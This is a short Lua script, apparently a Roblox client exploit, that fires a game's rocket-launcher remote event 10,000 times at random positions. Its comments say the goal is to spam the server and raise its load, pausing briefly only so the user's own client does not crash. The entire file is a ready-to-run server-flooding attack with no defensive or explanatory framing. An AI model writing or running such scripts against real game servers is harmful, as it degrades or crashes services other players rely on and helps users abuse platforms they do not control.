local numRockets = 10000 -- Increase the number of rockets for more server load

for i = 1, numRockets do
    local args = {
        [1] = Vector3.new(math.random(-1000, 1000), math.random(0, 1000), math.random(-1000, 1000)) -- Random target positions to increase processing load
    }

    -- Spam the server with rocket fire events
    game:GetService("Players").LocalPlayer.Character.RocketLauncher.BattleRocketEvent:FireServer(unpack(args))
    
    -- Add a small delay to avoid crashing yourself immediately
    if i % 500 == 0 then
        task.wait(0.01)
    end
end
